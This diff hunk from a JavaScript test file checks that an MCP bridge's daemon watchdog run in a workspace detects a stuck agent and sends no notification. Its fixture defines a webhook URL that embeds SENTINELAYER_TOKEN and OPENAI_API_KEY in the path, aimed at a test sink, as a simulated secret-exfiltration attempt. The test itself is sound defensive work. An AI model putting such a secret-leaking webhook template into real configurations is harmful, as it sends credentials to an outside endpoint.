@@ -143,8 +143,9 @@ test("the MCP bridge's daemon watchdog run in that workspace sends nothing", asy
     workspaceConfig: slackChannel(`${sink.url}/hook/\${SENTINELAYER_TOKEN}/\${OPENAI_API_KEY}`),
   });
   try {
-    const handlers = createCliCommandMcpToolHandlers(await buildCliCommandMcpTools(), { targetPath: fx.ws, env: fx.env });
-    const result = await handlers["sl.daemon.watchdog.run"]({ path: fx.ws, execute: true, timeoutMs: 60_000 });
+    // past the approval gate (the MCP dispatcher refuses every CLI tool; unit.mcp-bridge-approval)
+    const handlers = createCliCommandMcpToolHandlers(await buildCliCommandMcpTools(), { targetPath: fx.ws, env: fx.env, approve: () => true });
+    const result = await handlers["sl.daemon.watchdog.run"]({ path: ".", execute: true, timeoutMs: 60_000 });
     assert.equal(result.ok, true, String(result.stderr));
     assert.equal(result.json.summary.detectionCount, 1, "the stuck agent was detected");
     assert.equal(result.json.summary.notificationCount, 0);
